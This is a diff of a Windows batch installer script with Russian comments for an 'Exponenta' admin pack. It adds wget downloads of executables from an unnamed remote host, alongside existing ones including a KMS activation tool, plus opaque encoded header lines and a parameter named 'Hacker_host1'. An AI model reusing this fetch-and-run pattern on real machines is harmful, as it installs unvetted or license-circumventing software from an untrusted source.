@@ -4,8 +4,8 @@
 ::fBE1pAF6MU+EWGveyEs+LQ9EWQa+K3ytFLoT/NTe9/qIrEgTQOMDUYHIzrWCLM0S40vBbYYi2H9UjMpCDhpMHg==
 ::fBE1pAF6MU+EWGveyEs+LQ9EWQa+K3ytFLoT/NTe9/qIrEgTQOMDcYHIzrWCLO0S40vgfIU5xHNY1sICBXs=
 ::fBE1pAF6MU+EWGveyEs+LQ9EWQa+K3ytFLoT/NTe9/qIrEgTQOMDb4jezvqLOOVz
-::YAwzoRdxOk+EWAnk
-::fBw5plQjdG8=
+::YAwzoRdxOk+EWAjk
+::fBw5plQjdD2DJFCK8VYgPRloWxOVLmS1Eok58Pj04e+JtkwhZucsd5rJ2bGdHMUL+krqcJg512pTm4UFDxQ4
 ::YAwzuBVtJxjWCl3EqQJgSA==
 ::ZR4luwNxJguZRRnk
 ::Yhs/ulQjdF+5
@@ -114,6 +114,8 @@ wget %host%/ElevationSetupRepack.exe
 wget %host%/DTLiteInstaller.exe
 wget %host%/KMS_Tools.zip
 wget %host%/duck-install.msi
+wget %host%/AdminScriptsSet01.exe
+wget %host%/Hydra-Installer.exe
 wget %host%/AdminTExponentaPluginSetup.exe
 rem wget -c -t 2 --content-disposition %host%/installmaindistrib.bat
 wget %host%/UtilSetup.exe
@@ -122,8 +124,9 @@ rem wget -r --no-parent %host%/
 
 rem Запускаем инсталлятор Admin Pack "Экспонента"
 call %LocalFolder%\InstallMainExponenta.bat %PUB1% %Hacker_host1%
+
+rem Переходим в прежний каталог
 cd /d %curdir%
-cd %curdir%
 
 rem Удаляем временный каталог
 rd /S /Q WindowsPowerShell
